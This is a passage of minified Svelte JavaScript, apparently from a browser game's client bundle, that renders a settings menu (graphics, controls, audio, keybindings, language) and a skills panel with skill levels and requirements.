                    (!fe || 2097152 & e[0]) && F(Jt, t[21]),
                    2097152 & e[0] && Z(te, t[21]),
                    (!fe || 4194304 & e[0]) && F(oe, t[22]),
                    4194304 & e[0] && Z(le, t[22]),
                    (!fe || 8388608 & e[0]) && F(me, t[23]),
                    8388608 & e[0] && Z(pe, t[23])
            },
            i(t) {
                fe || (Et(Ee.$$.fragment, t),
                    Et(Me.$$.fragment, t),
                    Et(_e.$$.fragment, t),
                    Et(Ce.$$.fragment, t),
                    Et(Te.$$.fragment, t),
                    Et(Pe.$$.fragment, t),
                    Et(Ie.$$.fragment, t),
                    Et(De.$$.fragment, t),
                    Et(Ae.$$.fragment, t),
                    Et(Be.$$.fragment, t),
                    Et(Re.$$.fragment, t),
                    Et(ze.$$.fragment, t),
                    Et(Fe.$$.fragment, t),
                    Et(Ze.$$.fragment, t),
                    Et(Ue.$$.fragment, t),
                    Et(Le.$$.fragment, t),
                    Et(Ne.$$.fragment, t),
                    Et(Oe.$$.fragment, t),
                    fe = !0)
            },
            o(t) {
                Mt(Ee.$$.fragment, t),
                    Mt(Me.$$.fragment, t),
                    Mt(_e.$$.fragment, t),
                    Mt(Ce.$$.fragment, t),
                    Mt(Te.$$.fragment, t),
                    Mt(Pe.$$.fragment, t),
                    Mt(Ie.$$.fragment, t),
                    Mt(De.$$.fragment, t),
                    Mt(Ae.$$.fragment, t),
                    Mt(Be.$$.fragment, t),
                    Mt(Re.$$.fragment, t),
                    Mt(ze.$$.fragment, t),
                    Mt(Fe.$$.fragment, t),
                    Mt(Ze.$$.fragment, t),
                    Mt(Ue.$$.fragment, t),
                    Mt(Le.$$.fragment, t),
                    Mt(Ne.$$.fragment, t),
                    Mt(Oe.$$.fragment, t),
                    fe = !1
            },
            d(t) {
                t && _(e),
                    t && _(r),
                    C(Se, t),
                    t && _(o),
                    t && _(c),
                    t && _(h),
                    t && _(d),
                    t && _(u),
                    t && _(m),
                    t && _(p),
                    t && _(f),
                    t && _(g),
                    Ut(Ee, t),
                    t && _(v),
                    t && _(y),
                    t && _(b),
                    t && _(w),
                    t && _(x),
                    Ut(Me, t),
                    t && _(k),
                    Ut(_e, t),
                    t && _($),
                    Ut(Ce, t),
                    t && _(S),
                    Ut(Te, t),
                    t && _(D),
                    Ut(Pe, t),
                    t && _(z),
                    t && _(U),
                    t && _(N),
                    Ut(Ie, t),
                    t && _(O),
                    t && _(W),
                    t && _(Y),
                    t && _(V),
                    t && _(G),
                    Ut(De, t),
                    t && _(Q),
                    Ut(Ae, t),
                    t && _(J),
                    Ut(Be, t),
                    t && _(tt),
                    t && _(et),
                    t && _(st),
                    Ut(Re, t),
                    t && _(it),
                    Ut(ze, t),
                    t && _(nt),
                    Ut(Fe, t),
                    t && _(at),
                    t && _(dt),
                    t && _(mt),
                    t && _(bt),
                    t && _(wt),
                    t && _(xt),
                    t && _(kt),
                    t && _($t),
                    t && _(St),
                    Ut(Ze, t),
                    t && _(_t),
                    t && _(Ct),
                    t && _(Tt),
                    Ut(Ue, t),
                    t && _(Pt),
                    Ut(Le, t),
                    t && _(It),
                    t && _(Dt),
                    t && _(At),
                    t && _(Bt),
                    t && _(Rt),
                    Ut(Ne, t),
                    t && _(zt),
                    Ut(Oe, t),
                    t && _(Lt),
                    t && _(Nt),
                    t && _(Ot),
                    t && _(Wt),
                    t && _(Yt),
                    t && _(te),
                    t && _(ee),
                    t && _(se),
                    t && _(ie),
                    t && _(le),
                    t && _(ce),
                    t && _(pe),
                    l(ge)
            }
        }
    }
    function rS(t) {
        let e, s, n, a, r, o, c;
        return {
            c() {
                e = T("div"),
                    e.textContent = "" + Xi.ui.settings.sfxvolume,
                    s = T("input"),
                    n = T("div"),
                    n.textContent = "" + Xi.ui.settings.musicvolume,
                    a = T("input"),
                    r = T("div"),
                    r.textContent = "" + Xi.ui.settings.ambiencevolume,
                    o = T("input"),
                    B(s, "type", "range"),
                    B(a, "type", "range"),
                    B(o, "type", "range")
            },
            m(i, h, d) {
                M(i, e, h),
                    M(i, s, h),
                    Z(s, t[9]),
                    M(i, n, h),
                    M(i, a, h),
                    Z(a, t[10]),
                    M(i, r, h),
                    M(i, o, h),
                    Z(o, t[11]),
                    d && l(c),
                    c = [A(s, "change", t[38]), A(s, "input", t[38]), A(a, "change", t[39]), A(a, "input", t[39]), A(o, "change", t[40]), A(o, "input", t[40])]
            },
            p(t, e) {
                512 & e[0] && Z(s, t[9]),
                    1024 & e[0] && Z(a, t[10]),
                    2048 & e[0] && Z(o, t[11])
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    t && _(s),
                    t && _(n),
                    t && _(a),
                    t && _(r),
                    t && _(o),
                    l(c)
            }
        }
    }
    function oS(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g, v, y, b, w, x, k, $, S, R, z, U, L, N, O = Xi.ui.settings.mousesensitivity + "", j = t[7].toFixed(2) + "";
        const q = new G$({
            props: {
                store: Gs
            }
        })
            , X = new G$({
                props: {
                    store: Qs
                }
            })
            , H = new G$({
                props: {
                    store: Js
                }
            })
            , K = new G$({
                props: {
                    store: ti
                }
            });
        let W = Object.keys(t[0]).filter(pS).map(t[35])
            , Y = [];
        for (let e = 0; e < W.length; e += 1)
            Y[e] = dS(tS(t, W, e));
        return {
            c() {
                e = T("div"),
                    e.textContent = "" + Xi.ui.settings.camera,
                    s = T("div"),
                    i = T("div"),
                    n = P(O),
                    a = I(),
                    r = T("span"),
                    o = P(j),
                    c = T("input"),
                    h = T("div"),
                    h.textContent = "" + Xi.ui.settings.invertmousex,
                    Ft(q.$$.fragment),
                    d = T("div"),
                    d.textContent = "" + Xi.ui.settings.invertmousey,
                    Ft(X.$$.fragment),
                    u = T("div"),
                    u.textContent = "" + Xi.ui.settings.lockedcamera,
                    Ft(H.$$.fragment),
                    m = T("div"),
                    m.textContent = "" + Xi.ui.settings.pointerlock,
                    Ft(K.$$.fragment),
                    p = T("div"),
                    p.textContent = "Skillbar",
                    f = T("div"),
                    g = T("div"),
                    v = P("Skillbar slots "),
                    y = T("span"),
                    b = P(t[8]),
                    w = T("br"),
                    x = T("small"),
                    x.textContent = "Requires reload",
                    k = T("input"),
                    $ = T("div"),
                    $.textContent = "" + Xi.ui.settings.keybindings,
                    S = T("div"),
                    R = T("small"),
                    R.textContent = "Requires reload",
                    z = T("small"),
                    z.textContent = "To reset, leave field blank.";
                for (let t = 0; t < Y.length; t += 1)
                    Y[t].c();
                U = D(),
                    B(e, "class", "textprimary"),
                    B(r, "class", "textgrey"),
                    B(c, "type", "range"),
                    B(c, "step", "0.05"),
                    B(c, "min", "0.1"),
                    B(c, "max", "3"),
                    B(p, "class", "textprimary"),
                    B(y, "class", "textgrey"),
                    B(x, "class", "textgrey"),
                    B(k, "type", "range"),
                    B(k, "min", "10"),
                    B(k, "max", "24"),
                    B($, "class", "textprimary"),
                    B(R, "class", "textgrey"),
                    B(z, "class", "textprimary")
            },
            m(_, C, T) {
                M(_, e, C),
                    M(_, s, C),
                    M(_, i, C),
                    E(i, n),
                    E(i, a),
                    E(i, r),
                    E(r, o),
                    M(_, c, C),
                    Z(c, t[7]),
                    M(_, h, C),
                    Zt(q, _, C),
                    M(_, d, C),
                    Zt(X, _, C),
                    M(_, u, C),
                    Zt(H, _, C),
                    M(_, m, C),
                    Zt(K, _, C),
                    M(_, p, C),
                    M(_, f, C),
                    M(_, g, C),
                    E(g, v),
                    E(g, y),
                    E(y, b),
                    E(g, w),
                    E(g, x),
                    M(_, k, C),
                    Z(k, t[8]),
                    M(_, $, C),
                    M(_, S, C),
                    M(_, R, C),
                    M(_, z, C);
                for (let t = 0; t < Y.length; t += 1)
                    Y[t].m(_, C);
                M(_, U, C),
                    L = !0,
                    T && l(N),
                    N = [A(c, "change", t[33]), A(c, "input", t[33]), A(k, "change", t[34]), A(k, "input", t[34]), A(k, "change", t[27])]
            },
            p(t, e) {
                if ((!L || 128 & e[0]) && j !== (j = t[7].toFixed(2) + "") && F(o, j),
                    128 & e[0] && Z(c, t[7]),
                    (!L || 256 & e[0]) && F(b, t[8]),
                    256 & e[0] && Z(k, t[8]),
                    268435457 & e[0]) {
                    let s;
                    for (W = Object.keys(t[0]).filter(pS).map(t[35]),
                        s = 0; s < W.length; s += 1) {
                        const i = tS(t, W, s);
                        Y[s] ? Y[s].p(i, e) : (Y[s] = dS(i),
                            Y[s].c(),
                            Y[s].m(U.parentNode, U))
                    }
                    for (; s < Y.length; s += 1)
                        Y[s].d(1);
                    Y.length = W.length
                }
            },
            i(t) {
                L || (Et(q.$$.fragment, t),
                    Et(X.$$.fragment, t),
                    Et(H.$$.fragment, t),
                    Et(K.$$.fragment, t),
                    L = !0)
            },
            o(t) {
                Mt(q.$$.fragment, t),
                    Mt(X.$$.fragment, t),
                    Mt(H.$$.fragment, t),
                    Mt(K.$$.fragment, t),
                    L = !1
            },
            d(t) {
                t && _(e),
                    t && _(s),
                    t && _(i),
                    t && _(c),
                    t && _(h),
                    Ut(q, t),
                    t && _(d),
                    Ut(X, t),
                    t && _(u),
                    Ut(H, t),
                    t && _(m),
                    Ut(K, t),
                    t && _(p),
                    t && _(f),
                    t && _(g),
                    t && _(k),
                    t && _($),
                    t && _(S),
                    t && _(R),
                    t && _(z),
                    C(Y, t),
                    t && _(U),
                    l(N)
            }
        }
    }
    function lS(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g, v, y, b, w, x, k, $, S, C, I, D, R, z, F, U, L, N, O, j = Xi.ui.settings.ssao + "", q = Xi.ui.settings.grass + "", X = Xi.ui.settings.clouds + "", H = Xi.ui.settings.detailprops + "", K = Xi.ui.settings.shadows + "";
        const W = new G$({
            props: {
                store: He
            }
        })
            , Y = new G$({
                props: {
                    cb: t[27],
                    store: Ye
                }
            })
            , V = new G$({
                props: {
                    cb: t[27],
                    store: Ke
                }
            })
            , G = new G$({
                props: {
                    cb: t[27],
                    store: Ve
                }
            })
            , Q = new G$({
                props: {
                    cb: t[27],
                    store: Qe
                }
            })
            , J = new G$({
                props: {
                    store: Ge
                }
            })
            , tt = new G$({
                props: {
                    cb: t[27],
                    store: We
                }
            })
            , et = new G$({
                props: {
                    store: Xe
                }
            });
        return {
            c() {
                e = T("div"),
                    e.textContent = "" + Xi.ui.settings.resolution,
                    s = T("input"),
                    i = T("div"),
                    i.textContent = "" + Xi.ui.settings.viewrange,
                    n = T("input"),
                    a = T("div"),
                    a.textContent = "" + Xi.ui.settings.postprocessing,
                    Ft(W.$$.fragment),
                    r = T("div"),
                    o = P(j),
                    c = T("br"),
                    h = T("small"),
                    h.textContent = "Requires reload",
                    Ft(Y.$$.fragment),
                    d = T("div"),
                    u = P(q),
                    m = T("br"),
                    p = T("small"),
                    p.textContent = "Requires reload",
                    Ft(V.$$.fragment),
                    f = T("div"),
                    g = P(X),
                    v = T("br"),
                    y = T("small"),
                    y.textContent = "Requires reload",
                    Ft(G.$$.fragment),
                    b = T("div"),
                    w = P(H),
                    x = T("br"),
                    k = T("small"),
                    k.textContent = "Requires reload",
                    Ft(Q.$$.fragment),
                    $ = T("div"),
                    $.textContent = "" + Xi.ui.settings.particles,
                    Ft(J.$$.fragment),
                    S = T("div"),
                    S.textContent = "Shadows",
                    C = T("div"),
                    I = T("div"),
                    D = P(K),
                    R = T("br"),
                    z = T("small"),
                    z.textContent = "Requires reload",
                    Ft(tt.$$.fragment),
                    F = T("div"),
                    F.innerHTML = 'Shadow resolution<br><small class="textgrey">Requires reload</small>',
                    U = T("input"),
                    L = T("div"),
                    L.innerHTML = "Real time environment shadows<br>",
                    Ft(et.$$.fragment),
                    B(s, "type", "range"),
                    B(s, "min", "30"),
                    B(s, "step", "10"),
                    B(n, "type", "range"),
                    B(n, "min", "20"),
                    B(h, "class", "textgrey"),
                    B(p, "class", "textgrey"),
                    B(y, "class", "textgrey"),
                    B(k, "class", "textgrey"),
                    B(S, "class", "textprimary"),
                    B(z, "class", "textgrey"),
                    B(U, "type", "range"),
                    B(U, "min", "0"),
                    B(U, "max", "4")
            },
            m(_, T, P) {
                M(_, e, T),
                    M(_, s, T),
                    Z(s, t[4]),
                    M(_, i, T),
                    M(_, n, T),
                    Z(n, t[5]),
                    M(_, a, T),
                    Zt(W, _, T),
                    M(_, r, T),
                    E(r, o),
                    E(r, c),
                    E(r, h),
                    Zt(Y, _, T),
                    M(_, d, T),
                    E(d, u),
                    E(d, m),
                    E(d, p),
                    Zt(V, _, T),
                    M(_, f, T),
                    E(f, g),
                    E(f, v),
                    E(f, y),
                    Zt(G, _, T),
                    M(_, b, T),
                    E(b, w),
                    E(b, x),
                    E(b, k),
                    Zt(Q, _, T),
                    M(_, $, T),
                    Zt(J, _, T),
                    M(_, S, T),
                    M(_, C, T),
                    M(_, I, T),
                    E(I, D),
                    E(I, R),
                    E(I, z),
                    Zt(tt, _, T),
                    M(_, F, T),
                    M(_, U, T),
                    Z(U, t[6]),
                    M(_, L, T),
                    Zt(et, _, T),
                    N = !0,
                    P && l(O),
                    O = [A(s, "change", t[30]), A(s, "input", t[30]), A(n, "change", t[31]), A(n, "input", t[31]), A(U, "change", t[32]), A(U, "input", t[32]), A(U, "change", t[27])]
            },
            p(t, e) {
                16 & e[0] && Z(s, t[4]),
                    32 & e[0] && Z(n, t[5]),
                    64 & e[0] && Z(U, t[6])
            },
            i(t) {
                N || (Et(W.$$.fragment, t),
                    Et(Y.$$.fragment, t),
                    Et(V.$$.fragment, t),
                    Et(G.$$.fragment, t),
                    Et(Q.$$.fragment, t),
                    Et(J.$$.fragment, t),
                    Et(tt.$$.fragment, t),
                    Et(et.$$.fragment, t),
                    N = !0)
            },
            o(t) {
                Mt(W.$$.fragment, t),
                    Mt(Y.$$.fragment, t),
                    Mt(V.$$.fragment, t),
                    Mt(G.$$.fragment, t),
                    Mt(Q.$$.fragment, t),
                    Mt(J.$$.fragment, t),
                    Mt(tt.$$.fragment, t),
                    Mt(et.$$.fragment, t),
                    N = !1
            },
            d(t) {
                t && _(e),
                    t && _(s),
                    t && _(i),
                    t && _(n),
                    t && _(a),
                    Ut(W, t),
                    t && _(r),
                    Ut(Y, t),
                    t && _(d),
                    Ut(V, t),
                    t && _(f),
                    Ut(G, t),
                    t && _(b),
                    Ut(Q, t),
                    t && _($),
                    Ut(J, t),
                    t && _(S),
                    t && _(C),
                    t && _(I),
                    Ut(tt, t),
                    t && _(F),
                    t && _(U),
                    t && _(L),
                    Ut(et, t),
                    l(O)
            }
        }
    }
    function cS(t) {
        let e, s, i, n, a, r = t[63] + "";
        function o(...e) {
            return t[55](t[65], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = P(r),
                    i = T("div"),
                    B(i, "class", n = "btn checkbox " + (t[24][t[65]] ? "active" : ""))
            },
            m(t, n, r) {
                M(t, e, n),
                    E(e, s),
                    M(t, i, n),
                    r && a(),
                    a = A(i, "click", o)
            },
            p(e, s) {
                t = e,
                    16777216 & s[0] && n !== (n = "btn checkbox " + (t[24][t[65]] ? "active" : "")) && B(i, "class", n)
            },
            d(t) {
                t && _(e),
                    t && _(i),
                    a()
            }
        }
    }
    function hS(t) {
        let e, s, n, a = t[60].name + "";
        return {
            c() {
                e = T("option"),
                    s = P(a),
                    e.__value = n = t[60].val,
                    e.value = e.__value
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function dS(t) {
        let e, s, i, n, a = t[57].k.slice(2) + "";
        function r() {
            t[36].call(i, t[57])
        }
        function o(...e) {
            return t[37](t[57], ...e)
        }
        return {
            c() {
                e = T("div"),
                    s = P(a),
                    i = T("input"),
                    B(i, "type", "text")
            },
            m(a, c, h) {
                M(a, e, c),
                    E(e, s),
                    M(a, i, c),
                    Z(i, t[0].current[t[57].k]),
                    h && l(n),
                    n = [A(i, "input", r), A(i, "change", o)]
            },
            p(e, n) {
                t = e,
                    1 & n[0] && a !== (a = t[57].k.slice(2) + "") && F(s, a),
                    1 & n[0] && i.value !== t[0].current[t[57].k] && Z(i, t[0].current[t[57].k])
            },
            d(t) {
                t && _(e),
                    t && _(i),
                    l(n)
            }
        }
    }
    function uS(t) {
        let e, s, i, n, a, r, o, l, c, h = t[1].name + "", d = t[25], u = [];
        for (let e = 0; e < d.length; e += 1)
            u[e] = iS(eS(t, d, e));
        const m = [lS, oS, rS, aS, nS]
            , p = [];
        function f(t, e) {
            return "gfx" == t[1].id ? 0 : "controls" == t[1].id ? 1 : "audio" == t[1].id ? 2 : "ui" == t[1].id ? 3 : "chat" == t[1].id ? 4 : -1
        }
        return ~(o = f(t)) && (l = p[o] = m[o](t)),
        {
            c() {
                e = T("div"),
                    s = T("div");
                for (let t = 0; t < u.length; t += 1)
                    u[t].c();
                i = T("div"),
                    n = T("h3"),
                    a = P(h),
                    r = T("div"),
                    l && l.c(),
                    B(n, "class", "textprimary"),
                    B(r, "class", "settings svelte-15b6qta"),
                    B(i, "class", "menu panel-black scrollbar svelte-15b6qta"),
                    B(e, "class", "divide svelte-15b6qta")
            },
            m(t, l) {
                M(t, e, l),
                    E(e, s);
                for (let t = 0; t < u.length; t += 1)
                    u[t].m(s, null);
                E(e, i),
                    E(i, n),
                    E(n, a),
                    E(i, r),
                    ~o && p[o].m(r, null),
                    c = !0
            },
            p(t, e) {
                if (33554434 & e[0]) {
                    let i;
                    for (d = t[25],
                        i = 0; i < d.length; i += 1) {
                        const n = eS(t, d, i);
                        u[i] ? u[i].p(n, e) : (u[i] = iS(n),
                            u[i].c(),
                            u[i].m(s, null))
                    }
                    for (; i < u.length; i += 1)
                        u[i].d(1);
                    u.length = d.length
                }
                (!c || 2 & e[0]) && h !== (h = t[1].name + "") && F(a, h);
                let i = o;
                o = f(t),
                    o === i ? ~o && p[o].p(t, e) : (l && ($t(),
                        Mt(p[i], 1, 1, () => {
                            p[i] = null
                        }
                        ),
                        St()),
                        ~o ? (l = p[o],
                            l || (l = p[o] = m[o](t),
                                l.c()),
                            Et(l, 1),
                            l.m(r, null)) : l = null)
            },
            i(t) {
                c || (Et(l),
                    c = !0)
            },
            o(t) {
                Mt(l),
                    c = !1
            },
            d(t) {
                t && _(e),
                    C(u, t),
                    ~o && p[o].d()
            }
        }
    }
    function mS(t) {
        let e, s, i = t[3] && sS(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, s) {
                t[3] ? i ? (i.p(t, s),
                    8 & s[0] && Et(i, 1)) : (i = sS(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    const pS = t => "kb" == t.slice(0, 2);
    function fS(t, e, s) {
        let i, n, a, r, o, l, c, h, d, u, p, f, g, v, b, w, x, k, $, S, E, M;
        m(t, ls, t => s(3, i = t)),
            m(t, je, t => s(4, n = t)),
            m(t, Oe, t => s(5, a = t)),
            m(t, qe, t => s(6, r = t)),
            m(t, Vs, t => s(7, o = t)),
            m(t, gi, t => s(8, l = t)),
            m(t, ts, t => s(9, c = t)),
            m(t, es, t => s(10, h = t)),
            m(t, Je, t => s(11, d = t)),
            m(t, ss, t => s(12, u = t)),
            m(t, xs, t => s(13, p = t)),
            m(t, Rs, t => s(14, f = t)),
            m(t, Ns, t => s(15, g = t)),
            m(t, Os, t => s(16, v = t)),
            m(t, Ks, t => s(17, b = t)),
            m(t, Ws, t => s(18, w = t)),
            m(t, qs, t => s(19, x = t)),
            m(t, Zs, t => s(20, k = t)),
            m(t, rs, t => s(21, $ = t)),
            m(t, ns, t => s(22, S = t)),
            m(t, as, t => s(23, E = t)),
            m(t, ys, t => s(24, M = t));
        const _ = [{
            id: "ui",
            name: Xi.ui.settings.interface
        }, {
            id: "gfx",
            name: Xi.ui.settings.graphics
        }, {
            id: "controls",
            name: Xi.ui.settings.controls
        }, {
            id: "chat",
            name: Xi.ui.settings.chat
        }, {
            id: "audio",
            name: Xi.ui.settings.audio
        }];
        let C = _[0];
        const T = [{
            val: "en",
            name: "English"
        }, {
            val: "de",
            name: "German"
        }, {
            val: "nl",
            name: "Dutch"
        }, {
            val: "ru",
            name: "Russian"
        }, {
            val: "pt",
            name: "Portugese"
        }, {
            val: "es",
            name: "Spanish"
        }, {
            val: "fr",
            name: "French"
        }, {
            val: "ro",
            name: "Romanian"
        }, {
            val: "it",
            name: "Italian"
        }];
        let P = !1;
        const I = () => {
            s(2, P = !0)
        }
            , D = (t, e) => {
                e.set("" === t ? void 0 : t),
                    s(2, P = !0)
            }
            , A = (t, e) => {
                s(1, C = t)
            }
            ;
        function B() {
            n = R(this.value),
                je.set(n)
        }
        function z() {
            a = R(this.value),
                Oe.set(a)
        }
        function F() {
            r = R(this.value),
                qe.set(r)
        }
        function Z() {
            o = R(this.value),
                Vs.set(o)
        }
        function U() {
            l = R(this.value),
                gi.set(l)
        }
        function L(t) {
            ji[t.k] = this.value,
                s(0, qi)
        }
        const O = (t, e) => {
            D(ji[t.k], t.s)
        }
            ;
        function j() {
            c = R(this.value),
                ts.set(c)
        }
        function q() {
            h = R(this.value),
                es.set(h)
        }
        function X() {
            d = R(this.value),
                Je.set(d)
        }
        function H() {
            u = N(this),
                ss.set(u),
                s(26, T)
        }
        function K() {
            p = R(this.value),
                xs.set(p)
        }
        function W() {
            f = R(this.value),
                Rs.set(f)
        }
        function Y() {
            g = R(this.value),
                Ns.set(g)
        }
        function V() {
            v = R(this.value),
                Os.set(v)
        }
        function G() {
            b = R(this.value),
                Ks.set(b)
        }
        function Q() {
            w = R(this.value),
                Ws.set(w)
        }
        function J() {
            x = R(this.value),
                qs.set(x)
        }
        function tt() {
            k = R(this.value),
                Zs.set(k)
        }
        function et() {
            $ = R(this.value),
                rs.set($)
        }
        function st() {
            S = R(this.value),
                ns.set(S)
        }
        function it() {
            E = R(this.value),
                as.set(E)
        }
        const nt = (t, e) => y(ys, M[t] = M[t] ? 0 : 1, M)
            , at = () => {
                y(ls, i = !1),
                    P && window.location.reload()
            }
            ;
        return [qi, C, P, i, n, a, r, o, l, c, h, d, u, p, f, g, v, b, w, x, k, $, S, E, M, _, T, I, D, A, B, z, F, Z, U, t => ({
            k: t,
            s: qi[t]
        }), L, O, j, q, X, H, t => Ts.set(0), t => Ts.set(Gy.length), K, W, Y, V, G, Q, J, tt, et, st, it, nt, at]
    }
    class gS extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, fS, mS, h, {}, [-1, -1, -1])
        }
    }
    function vS(t, e, s) {
        const i = t.slice();
        return i[11] = e[s],
            i
    }
    function yS(t, e, s) {
        const i = t.slice();
        return i[11] = e[s],
            i
    }
    function bS(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: "Skills",
                icon: "book",
                $$slots: {
                    default: [SS]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[9]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "l-upperLeftModal container svelte-r0v48m")
            },
            m(n, a) {
                M(n, e, a),
                    Zt(i, e, null),
                    t[10](e),
                    s = !0
            },
            p(t, e) {
                const s = {};
                65563 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(s) {
                s && _(e),
                    Ut(i),
                    t[10](null)
            }
        }
    }
    function wS(t) {
        let e;
        const s = new ek({
            props: {
                level: t[11].level,
                skill: t[11].logic
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                16 & e && (i.level = t[11].level),
                    16 & e && (i.skill = t[11].logic),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function xS(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m = Xi.items.book[t[11].logic.id].name + "", p = t[11].logic.engineOnly ? "Default" : "Lv. " + t[11].level, f = void 0 !== t[11].logic.onCast ? "Spell" : "Passive";
        const g = new lx({
            props: {
                descPos: "left:100%;top:0;",
                descRoot: t[0],
                border: "white",
                data: {},
                pickable: void 0 !== t[11].logic.onCast,
                meta: {
                    type: "skill",
                    skill: t[11].logic
                },
                css: "slotskill",
                img: `/assets/ui/skills/${t[11].logic.id}.${Ro}?v=4002247`,
                $$slots: {
                    default: [wS]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        function v(...e) {
            return t[7](t[11], ...e)
        }
        return {
            c() {
                e = T("div"),
                    Ft(g.$$.fragment),
                    s = T("div"),
                    i = T("div"),
                    n = P(m),
                    a = T("span"),
                    r = T("div"),
                    o = P(p),
                    l = I(),
                    c = P(f),
                    B(a, "class", "textgrey"),
                    B(i, "class", "textprimary name svelte-r0v48m"),
                    B(r, "class", "textgrey"),
                    B(e, "class", h = (t[11].logic.engineOnly ? "panel-black" : "btn") + " grid " + (t[1] == t[11] ? "grey" : "black") + " svelte-r0v48m")
            },
            m(t, h, m) {
                M(t, e, h),
                    Zt(g, e, null),
                    E(e, s),
                    E(s, i),
                    E(i, n),
                    E(i, a),
                    E(s, r),
                    E(r, o),
                    E(r, l),
                    E(r, c),
                    d = !0,
                    m && u(),
                    u = A(e, "click", v)
            },
            p(s, i) {
                t = s;
                const a = {};
                1 & i && (a.descRoot = t[0]),
                    16 & i && (a.pickable = void 0 !== t[11].logic.onCast),
                    16 & i && (a.meta = {
                        type: "skill",
                        skill: t[11].logic
                    }),
                    16 & i && (a.img = `/assets/ui/skills/${t[11].logic.id}.${Ro}?v=4002247`),
                    65552 & i && (a.$$scope = {
                        dirty: i,
                        ctx: t
                    }),
                    g.$set(a),
                    (!d || 16 & i) && m !== (m = Xi.items.book[t[11].logic.id].name + "") && F(n, m),
                    (!d || 16 & i) && p !== (p = t[11].logic.engineOnly ? "Default" : "Lv. " + t[11].level) && F(o, p),
                    (!d || 16 & i) && f !== (f = void 0 !== t[11].logic.onCast ? "Spell" : "Passive") && F(c, f),
                    (!d || 18 & i && h !== (h = (t[11].logic.engineOnly ? "panel-black" : "btn") + " grid " + (t[1] == t[11] ? "grey" : "black") + " svelte-r0v48m")) && B(e, "class", h)
            },
            i(t) {
                d || (Et(g.$$.fragment, t),
                    d = !0)
            },
            o(t) {
                Mt(g.$$.fragment, t),
                    d = !1
            },
            d(t) {
                t && _(e),
                    Ut(g),
                    u()
            }
        }
    }
    function kS(t) {
        let e;
        const s = new ek({
            props: {
                level: 1,
                skill: t[11]
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                16 & e && (i.skill = t[11]),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function $S(t) {
        let e, s, i, n, a, r, o, l, c = Xi.items.book[t[11].id].name + "", h = t[11].minlevel + "";
        const d = new lx({
            props: {
                descPos: "left:100%;top:0;",
                descRoot: t[0],
                border: "grey filtered",
                data: {},
                pickable: !1,
                meta: {
                    type: "skill",
                    skill: t[11]
                },
                css: "slotskill",
                img: `/assets/ui/skills/${t[11].id}.${Ro}?v=4002247`,
                $$slots: {
                    default: [kS]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return {
            c() {
                e = T("div"),
                    Ft(d.$$.fragment),
                    s = T("div"),
                    i = T("div"),
                    n = P(c),
                    a = T("div"),
                    r = P("Requires Lv. "),
                    o = P(h),
                    B(i, "class", "name svelte-r0v48m"),
                    B(s, "class", "textgrey"),
                    B(e, "class", "panel-black grid svelte-r0v48m")
            },
            m(t, c) {
                M(t, e, c),
                    Zt(d, e, null),
                    E(e, s),
                    E(s, i),
                    E(i, n),
                    E(s, a),
                    E(a, r),
                    E(a, o),
                    l = !0
            },
            p(t, e) {
                const s = {};
                1 & e && (s.descRoot = t[0]),
                    16 & e && (s.meta = {
                        type: "skill",
                        skill: t[11]
                    }),
                    16 & e && (s.img = `/assets/ui/skills/${t[11].id}.${Ro}?v=4002247`),
                    65552 & e && (s.$$scope = {
                        dirty: e,
                        ctx: t
                    }),
                    d.$set(s),
                    (!l || 16 & e) && c !== (c = Xi.items.book[t[11].id].name + "") && F(n, c),
                    (!l || 16 & e) && h !== (h = t[11].minlevel + "") && F(o, h)
            },
            i(t) {
                l || (Et(d.$$.fragment, t),
                    l = !0)
            },
            o(t) {
                Mt(d.$$.fragment, t),
                    l = !1
            },
            d(t) {
                t && _(e),
                    Ut(d)
            }
        }
    }
    function SS(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m, p = t[3][23] + "", f = t[4], g = [];
        for (let e = 0; e < f.length; e += 1)
            g[e] = xS(yS(t, f, e));
        const v = t => Mt(g[t], 1, 1, () => {
            g[t] = null
        }
        );
        let y = Array.from(by.values()).filter(t[8]).sort(MS)
            , b = [];
        for (let e = 0; e < y.length; e += 1)
            b[e] = $S(vS(t, y, e));
        const w = t => Mt(b[t], 1, 1, () => {
            b[t] = null
        }
        );
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    i = T("span"),
                    n = P("Skill points: "),
                    a = P(p),
                    r = T("div"),
